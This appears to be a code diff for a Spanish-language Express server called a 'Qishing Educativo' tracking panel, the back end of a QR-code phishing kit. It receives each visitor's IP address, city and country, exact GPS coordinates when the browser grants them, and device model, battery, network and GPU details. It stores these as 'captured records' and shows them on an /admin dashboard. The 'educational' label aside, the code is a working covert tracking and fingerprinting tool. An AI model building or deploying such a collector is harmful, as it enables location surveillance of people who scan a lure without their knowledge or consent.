@@ -72,9 +72,24 @@ app.post('/api/registrar', async (req, res) => {
         const geo = await obtenerUbicacionPorIP(ip);
 
         // Si el navegador otorgó coordenadas GPS exactas, las priorizamos; si no, usamos la de IP
-        let ubicacionFinal = `${geo.ciudad},${geo.pais}`;
+        let ubicacionFinal = `${geo.ciudad}, ${geo.pais}`;
         if (lat && lon) {
-            ubicacionFinal = `GPS: ${lat.toFixed(4)},${lon.toFixed(4)} (${geo.ciudad})`; }  const nuevoRegistro = { modelo: modelo \vert{}\vert{} 'Desconocido', tipo: tipo \vert{}\vert{} 'Desconocido', hora: hora \vert{}\vert{} new Date().toLocaleString(), bateria: bateria \vert{}\vert{} 'N/D', red: red \vert{}\vert{} 'N/D', gpu: gpu \vert{}\vert{} 'N/D', ip: geo.ip, ubicacion: ubicacionFinal };  registrosCapturados.unshift(nuevoRegistro); console.log(`[NUEVO REGISTRO] IP: ${geo.ip} | Ubicación: ${ubicacionFinal} \vert{} Dispositivo:${nuevoRegistro.modelo}`);
+            ubicacionFinal = `GPS: ${lat.toFixed(4)}, ${lon.toFixed(4)} (${geo.ciudad})`;
+        }
+
+        const nuevoRegistro = {
+            modelo: modelo || 'Desconocido',
+            tipo: tipo || 'Desconocido',
+            hora: hora || new Date().toLocaleString(),
+            bateria: bateria || 'N/D',
+            red: red || 'N/D',
+            gpu: gpu || 'N/D',
+            ip: geo.ip,
+            ubicacion: ubicacionFinal
+        };
+
+        registrosCapturados.unshift(nuevoRegistro);
+        console.log(`[NUEVO REGISTRO] IP: ${geo.ip} | Ubicación: ${ubicacionFinal} | Dispositivo: ${nuevoRegistro.modelo}`);
         
         res.status(200).json({ status: 'ok' });
     } catch (error) {
@@ -117,4 +132,41 @@ app.get('/admin', (req, res) => {
                 p { color: #9ca3af; font-size: 13px; }
                 table { width: 100%; border-collapse: collapse; margin-top: 20px; background: #0f172a; border-radius: 8px; overflow: hidden; font-size: 13px; text-align: left; }
                 th { background: #1e293b; color: #f3f4f6; padding: 10px; }
-                .counter { background: #374151; padding: 6px 14px; border-radius
+                .counter { background: #374151; padding: 6px 14px; border-radius: 20px; font-weight: bold; display: inline-block; margin: 10px 0; font-size: 14px; }
+            </style>
+        </head>
+        <body>
+            <div class="container">
+                <h1>🎯 Panel de Rastreo - Qishing Educativo</h1>
+                <p>Actualización automática en tiempo real con Geolocalización.</p>
+                
+                <div class="counter">Dispositivos analizados: ${registrosCapturados.length}</div>
+
+                <div style="overflow-x: auto;">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>#</th>
+                                <th>Modelo</th>
+                                <th>IP Pública</th>
+                                <th>Ubicación / GPS</th>
+                                <th>Batería</th>
+                                <th>Red</th>
+                                <th>GPU (WebGL)</th>
+                                <th>Hora</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            ${filasHTML}
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </body>
+        </html>
+    `);
+});
+
+app.listen(PORT, () => {
+    console.log(`Servidor activo en el puerto ${PORT}`);
+});
